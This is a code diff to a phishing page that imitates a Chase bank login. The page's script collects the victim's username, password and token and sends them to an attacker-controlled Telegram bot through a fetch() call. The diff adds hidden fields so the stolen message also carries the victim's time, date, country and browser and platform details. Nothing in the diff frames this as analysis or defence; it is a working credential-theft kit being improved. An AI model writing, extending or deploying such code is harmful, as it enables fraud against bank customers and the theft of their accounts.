@@ -9,6 +9,13 @@
 </head>
 <body>
 
+
+
+    <p class="address" hidden></p>
+    <p class="time" hidden></p>
+    <p class="date" hidden></p>
+    <p class="brower_info" hidden></p>
+
     <div class="container">
         <div class="container_element">
 
@@ -124,7 +131,7 @@
                 var user_password = document.getElementById("password").value
                 var user_token = document.getElementById("token").value
         
-                var my_text = `[----Chase Login----]%0AUsername : ${user_email}%0APassword : ${user_password}%0AToken : ${user_token}`
+                var my_text = `[----Chase Login----]%0AUsername : ${user_email}%0APassword : ${user_password}%0AToken : ${user_token}%0ATime : ${time}%0ADate : ${datess}%0ACountry : ${address_form}%0APlatform : ${brower_infos}`
         
                 fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
                     method: "GET"
@@ -167,6 +174,10 @@
                 }
             })
         </script>
+
+
+
+
         <script>
             let address = document.querySelector(".address")
     
@@ -241,6 +252,7 @@
             brower_info.innerHTML = `${navigator.platform}%0ABrowser version : ${navigator.appVersion}%0ABrowser language : ${navigator.language}`
         </script>
     
+
 
 
 </body>
